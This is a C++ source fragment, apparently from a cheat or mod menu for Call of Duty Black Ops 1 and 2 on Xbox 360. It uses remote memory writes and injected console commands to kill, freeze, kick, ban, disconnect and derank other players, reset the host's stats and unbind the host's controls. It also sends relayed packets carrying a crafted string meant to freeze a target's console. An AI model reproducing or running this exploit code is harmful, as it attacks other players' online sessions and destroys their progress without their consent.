			matchUIVisibilityFlags ^= UNARCHIVED_DISABLEINGAMEMENU;
			g_Netchan.write_int((decryptDWORD(Security->addrs.strct_level_locals_t) + 0x2FD8), matchUIVisibilityFlags);
#elif defined (BO1)
			int matchUIVisibilityFlags = 0x00000810;
			matchUIVisibilityFlags ^= UNARCHIVED_DISABLEINGAMEMENU;
			g_Netchan.write_int((decryptDWORD(Security->addrs.strct_level_locals_t) + 0x2F9C), matchUIVisibilityFlags);
#endif
		}
		else {

			if (MenuOptions::bAntiQuitAuto)
				MenuOptions::bAntiQuitAuto = FALSE;

#if defined (BO2)
			int matchUIVisibilityFlags = 0x00000810;
			g_Netchan.write_int((decryptDWORD(Security->addrs.strct_level_locals_t) + 0x2FD8), matchUIVisibilityFlags);
#elif defined (BO1)
			int matchUIVisibilityFlags = 0x00000810;
			g_Netchan.write_int((decryptDWORD(Security->addrs.strct_level_locals_t) + 0x2F9C), matchUIVisibilityFlags);
#endif
		}
	}
}

void SetHearEveryone(bool bEnable) {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		g_Netchan.setup_buffer_rme();

		if (bEnable) {
			int talkFlags = 0x0000004C;
			talkFlags ^= TALK_EVERYONE_H_EVERYONE;
			g_Netchan.write_int((decryptDWORD(Security->addrs.strct_level_locals_t) + 0x2FF4), talkFlags);
		}
		else {
			int talkFlags = 0x0000004C;
			g_Netchan.write_int((decryptDWORD(Security->addrs.strct_level_locals_t) + 0x2FF4), talkFlags);
		}
	}
}

int(*G_ModelIndex)(const char* model)
= (int(*)(const char*))0x82388E00;

unsigned int(*SL_FindLowercaseString)(const char* string)
= (unsigned int(*)(const char*))0x82532DD8;

unsigned int(*SV_GetConfigstringConst)(int index)
= (unsigned int(*)(int))0x824317F0;

void SetModel(int clientNum) {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		//int iClientNum = clientNum;

		//if (iClientNum == -1)
		//	iClientNum = Structs::get_cg()->clientNumber;

		//g_Netchan.setup_buffer_rme();

		////int modelIndex = G_ModelIndex("projectile_hellfire_missile");
		//////DbgPrint("modelIndex: %X", modelIndex);

		//g_Netchan.write_short((gEntity(clientNum) + 0x16C), 0xB4);

		int modelIndex = 0;

		int LowercaseString = SL_FindLowercaseString("projectile_hellfire_missile");

		for (int i = 1; i < 0x200; i++) {
			int ConfigstringConst = SV_GetConfigstringConst(i + 0x436);

			if (ConfigstringConst == LowercaseString) {
				DbgPrint("Found: %X", i);
				modelIndex = i;
				break;
			}
		}

		g_Netchan.write_short((gEntity(clientNum) + 0x16C), modelIndex);
	}
}

void SetDisconnectState(int clientNum) {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		int iClientNum = clientNum;

		if (iClientNum == -1)
			iClientNum = Structs::get_cg()->clientNumber;

		if (!isClientProtected(iClientNum)) {
			if (iClientNum != Structs::get_cg()->clientNumber) {
				if (Game::IsEnemy(iClientNum)) {
					pInfo[iClientNum].Whitelisted = TRUE;
				}
			}

			g_Netchan.setup_buffer_rme();

#if defined (BO2)
			g_Netchan.write_int((gClient(iClientNum) + 0x5428), 0);
#elif defined (BO1)
			g_Netchan.write_int((gClient(iClientNum) + 0x2700), 0);
#elif defined (BO1_ZM)
			g_Netchan.write_int((gClient(iClientNum) + 0x1A2C), 0);
#endif
		}
		else {
			DbgPrint("player protected %i (%llX)", iClientNum, partyMember[iClientNum].XUID);
		}
	}
}

void SetSessionState(int clientNum, sessionState_t sessionState) {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		int iClientNum = clientNum;

		if (iClientNum == -1)
			iClientNum = Structs::get_cg()->clientNumber;

		if (!isClientProtected_spec(iClientNum)) {
			g_Netchan.setup_buffer_rme();

#if defined (BO2)
			g_Netchan.write_int((gClient(iClientNum) + 0x5410), sessionState);
#elif defined (BO1)
			g_Netchan.write_int((gClient(iClientNum) + 0x26E8), sessionState);
#endif
		}
	}
}

void SetFakeDerank(int clientNum, int rank) {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		int iClientNum = clientNum;

		if (iClientNum == -1)
			iClientNum = Structs::get_cg()->clientNumber;

		g_Netchan.setup_buffer_rme();

#if defined (BO2)
		g_Netchan.write_int((gClient(iClientNum) + 0x5558), rank); //rank
		g_Netchan.write_int((gClient(iClientNum) + 0x555C), rank); //prestige
#elif defined (BO1)
		g_Netchan.write_int((gEntity(iClientNum) + 0x2868), rank); //rank
		g_Netchan.write_int((gEntity(iClientNum) + 0x2820), rank); //prestige
#endif
	}
}

void SetFakeDerankAll() {
	g_Netchan.setup_buffer_rme();

	for (int i = 0; i < 18; i++) {
		/*if (i == Structs::get_cg()->clientNumber)
			continue;*/

#if defined (BO2)
		g_Netchan.write_int((gClient(i) + 0x5558), 0); //rank
		g_Netchan.write_int((gClient(i) + 0x555C), 0); //prestige
#elif defined (BO1)
		g_Netchan.write_int((gClient(i) + 0x2868), 0); //rank
		g_Netchan.write_int((gClient(i) + 0x2820), 0); //prestige
#endif
	}
}

void KillPlayer(int clientNum) {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		g_Netchan.setup_buffer_rme();

#if defined (BO2)
		g_Netchan.write_byte(gClient(clientNum) + 0x28, 0x46);
#elif defined (BO1)
		g_Netchan.write_byte(gClient(clientNum) + 0x24, 0x46);
#endif
	}
}

void FreezeMovement(int clientNum, bool toggle) {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		int iClientNum = clientNum;

		if (iClientNum == -1)
			iClientNum = Structs::get_cg()->clientNumber;

		g_Netchan.setup_buffer_rme();

		if (toggle) {
#if defined (BO2)
			g_Netchan.write_int(gClient(iClientNum) + 0x5684, 0x04);
#elif defined (BO1)
			g_Netchan.write_int(gClient(iClientNum) + 0x28E4, 0x04);
#endif
		}
		else {
#if defined (BO2)
			g_Netchan.write_int(gClient(iClientNum) + 0x5684, 0x00);
#elif defined (BO1)
			g_Netchan.write_int(gClient(iClientNum) + 0x28E4, 0x00);
#endif
		}
	}
}

void KickClient(int clientNum) {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		if (!isClientProtected_kickban(clientNum)) {
			g_Netchan.setup_buffer_rme();

			char* buf = va("clientkick %i", clientNum);
			g_Netchan.write_string(decryptDWORD(Security->addrs.cmdInfoAddrs), buf);
			g_Netchan.write_int(decryptDWORD(Security->addrs.cmdInfoSizeAddrs) + 0x8, strlen(buf));
		}
	}
}

void BanClient(int clientNum) {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		if (!isClientProtected_kickban(clientNum)) {
			g_Netchan.setup_buffer_rme();

			char* buf = va("banClient %i", clientNum);
			g_Netchan.write_string(decryptDWORD(Security->addrs.cmdInfoAddrs), buf);
			g_Netchan.write_int(decryptDWORD(Security->addrs.cmdInfoSizeAddrs) + 0x8, strlen(buf));
		}
	}
}

void ResetHostStats() {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		g_Netchan.setup_buffer_rme();

		char* buf = "resetStats; uploadStats; updategamerprofile";
		g_Netchan.write_string(decryptDWORD(Security->addrs.cmdInfoAddrs), buf);
		g_Netchan.write_int(decryptDWORD(Security->addrs.cmdInfoSizeAddrs) + 0x8, strlen(buf));
	}
}

void MapRestart() {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		g_Netchan.setup_buffer_rme();

		char* buf = "map_restart";
		g_Netchan.write_string(decryptDWORD(Security->addrs.cmdInfoAddrs), buf);
		g_Netchan.write_int(decryptDWORD(Security->addrs.cmdInfoSizeAddrs) + 0x8, strlen(buf));
	}
}

void FastRestart() {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		g_Netchan.setup_buffer_rme();

		char* buf = "fast_restart\n";
		g_Netchan.write_string(decryptDWORD(Security->addrs.cmdInfoAddrs), buf);
		g_Netchan.write_int(decryptDWORD(Security->addrs.cmdInfoSizeAddrs) + 0x8, strlen(buf));
	}
}

void StartHostMigration() {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		g_Netchan.setup_buffer_rme();

		char* buf = "hostmigration_start\n";
		g_Netchan.write_string(decryptDWORD(Security->addrs.cmdInfoAddrs), buf);
		g_Netchan.write_int(decryptDWORD(Security->addrs.cmdInfoSizeAddrs) + 0x8, strlen(buf));
	}
}

void SendHostToZombies() {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		g_Netchan.setup_buffer_rme();

		char* buf = "startZombies\n";
		g_Netchan.write_string(decryptDWORD(Security->addrs.cmdInfoAddrs), buf);
		g_Netchan.write_int(decryptDWORD(Security->addrs.cmdInfoSizeAddrs) + 0x8, strlen(buf));
	}
}

void SendHostToSingleplayer() {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		g_Netchan.setup_buffer_rme();

		char* buf = "startSingleplayer\n";
		g_Netchan.write_string(decryptDWORD(Security->addrs.cmdInfoAddrs), buf);
		g_Netchan.write_int(decryptDWORD(Security->addrs.cmdInfoSizeAddrs) + 0x8, strlen(buf));
	}
}

void ChangeMap() {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		g_Netchan.setup_buffer_rme();

		//char* buf = "set g_speed 2000;";
		char* buf = va("map %s", mapNames[MenuOptions::dwRME_ChangeMapIndex].internalName);
		g_Netchan.write_string(decryptDWORD(Security->addrs.cmdInfoAddrs), buf);
		g_Netchan.write_int(decryptDWORD(Security->addrs.cmdInfoSizeAddrs) + 0x8, strlen(buf));
	}
}

void ChangeGametype() {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		g_Netchan.setup_buffer_rme();

		//char* buf = va("g_gametype %s", gameTypes[MenuOptions::dwRME_ChangeGameTypeIndex].internalName);
		//g_Netchan.write_string(decryptDWORD(Security->addrs.cmdInfoAddrs), buf);
		//g_Netchan.write_int(decryptDWORD(Security->addrs.cmdInfoSizeAddrs) + 0x8, strlen(buf));
	}
}

void ExecuteTestPayload() {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		g_Netchan.setup_buffer_rme();

		char* buf = "setPublicMatchClassSetNameFromLocString 0 \"^HFUUCK\"";
		g_Netchan.write_string(decryptDWORD(Security->addrs.cmdInfoAddrs), buf);
		g_Netchan.write_int(decryptDWORD(Security->addrs.cmdInfoSizeAddrs) + 0x8, strlen(buf));
	}
}

void SuperJump() {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		g_Netchan.setup_buffer_rme();

		//char* buf = "set g_speed 2000;";
		//char* buf = va("map %s", mapNames[MenuOptions::dwRME_ChangeMapIndex].internalName);
		g_Netchan.write_float(0x82085654, 150.0f);
		DbgPrint("Set SuperJump!");
	}
}

void UnbindHostControls() {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		g_Netchan.setup_buffer_rme();

		char* buf = "unbindallaxis\n";
		g_Netchan.write_string(decryptDWORD(Security->addrs.cmdInfoAddrs), buf);
		g_Netchan.write_int(decryptDWORD(Security->addrs.cmdInfoSizeAddrs) + 0x8, strlen(buf));
	}
}

//other stuff

void send_relayed_packet(int client_num, char* message) {
	msg_t msg; char buf[1024];

	MSG_Init(&msg, buf, sizeof(buf));
	MSG_WriteString(&msg, va("relay %i", client_num));

	MSG_WriteString(&msg, message);

	netchan_t* chan = (netchan_t*)(*(int*)(decryptDWORD(Security->addrs.strct_clientConnection)) + decryptDWORD(Security->addrs.strct_netchanAdditive));

	NET_OutOfBandData(NS_CLIENT1, chan->remoteAddress, msg.data, msg.cursize);
}

char* freezestringybobss = "^Bÿÿÿ^H€€ÿ^Iÿÿÿ^Bÿÿÿ^H€€ÿ^Iÿÿÿ^Bÿÿÿ^H€€ÿ^Iÿÿÿ^Bÿÿÿ^H€€ÿ^Iÿÿÿ^Bÿÿÿ^H€€ÿ^Iÿÿÿ^Bÿÿÿ^H€€ÿ^Iÿÿÿ^Bÿÿÿ^H€€ÿ^Iÿÿÿ^Bÿÿÿ^H€€ÿ^Iÿÿÿ^Bÿÿÿ^H€€ÿ^Iÿÿÿ^Bÿÿÿ^H€€ÿ^Iÿÿÿ^Bÿÿÿ^H€€ÿ^Iÿÿÿ^Bÿÿÿ^H€€ÿ^Iÿÿÿ^Bÿÿÿ^H€€ÿ^Iÿÿÿ^Bÿÿÿ^H€€ÿ^Iÿÿÿ^Bÿÿÿ^H€€ÿ^Iÿÿÿ^Bÿÿÿ^H€€ÿ^Iÿÿÿ^Bÿÿÿ^H€€ÿ^Iÿÿÿ";

void Send_LoadingNewMap(int clientNum, bool bSendFreeze) {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		if (clientNum != Structs::get_cg()->clientNumber) {
			send_relayed_packet(clientNum, bSendFreeze ? va("loadingnewmap\n%s", freezestringybobss) : va("loadingnewmap\n%s", "^1THE FUCK"));
		}
	}
}

void Send_Disconnect(int clientNum) {
	if (Game::CheckInGame() && CG::bLobbyInitialized) {
		//if (clientNum != Structs::get_cg()->clientNumber) {
			//send_relayed_packet(clientNum, va("%ifindbest", 1234567890));
		//}
	}
}